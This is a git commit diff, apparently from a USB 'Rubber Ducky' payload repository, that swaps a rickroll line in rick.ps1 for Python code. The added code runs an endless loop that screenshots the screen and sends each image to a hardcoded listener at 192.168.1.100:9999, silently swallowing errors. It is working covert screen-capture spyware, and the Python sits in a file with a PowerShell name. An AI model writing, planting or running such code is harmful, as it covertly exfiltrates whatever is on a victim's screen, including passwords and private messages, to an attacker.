f85fc5a853693c4acf44eaa9ff580c50fe749d22
RubberDuckyyyy <lev.marinchenko@gmail.com>
2025-07-25 18:57:50 +0200

    Update rick.ps1

--- rick.ps1
+++ rick.ps1
@@ -1,1 +1,24 @@
-Start-Process "https://youtu.be/xvFZjo5PgG0?si=LIokn0aqU1vkCdNJ"
+import socket
+import pyautogui
+import io
+from PIL import Image
+
+server_ip = "192.168.1.100"  # <-- Твой IP
+server_port = 9999
+
+while True:
+    # Сделать скриншот
+    screenshot = pyautogui.screenshot()
+
+    # Сжать в JPEG и отправить
+    img_bytes = io.BytesIO()
+    screenshot.save(img_bytes, format='JPEG', quality=50)
+    data = img_bytes.getvalue()
+
+    # Отправка по сети
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.connect((server_ip, server_port))
+            s.sendall(len(data).to_bytes(4, 'big') + data)
+        except:
+            pass
